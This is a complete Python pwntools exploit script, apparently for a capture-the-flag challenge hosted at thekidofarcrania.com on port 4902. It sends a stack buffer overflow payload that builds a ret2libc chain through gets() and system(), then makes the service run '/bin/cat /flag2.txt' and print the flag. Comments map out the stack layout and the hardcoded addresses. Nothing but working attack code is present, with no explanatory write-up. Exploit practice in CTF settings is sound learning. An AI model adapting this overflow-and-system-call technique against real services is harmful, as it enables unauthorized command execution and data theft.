from pwn import *

io = remote('thekidofarcrania.com',4902)
print('Connected!')
io.recvuntil('Input some text:')
print('Sending Data')

#0x08048400 -> gets
#0x08048420 -> system
#0x0804a0a2 -> address to store '/bin/cat /flag2.txt'

#ret2libc
#Buffer
#SFP
#RET==system()
#4 bytes PAD
#ARG to system()
					     #4 pad of gets	#4 pad of system
	    #stack buf   #gets first ret     #system next ret   #arg of gets      #arg of system
io.sendline('A'*(48+8+4)+'\x00\x84\x04\x08'+'\x20\x84\x04\x08'+'\xa2\xa0\x04\x08'+'\xa2\xa0\x04\x08')
print('Gets...')
io.recvuntil('Return address: 0x08048400')
print('Sending Payload...')
io.sendline('/bin/cat /flag2.txt')
print('Getting flag...')

print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))

io.close()
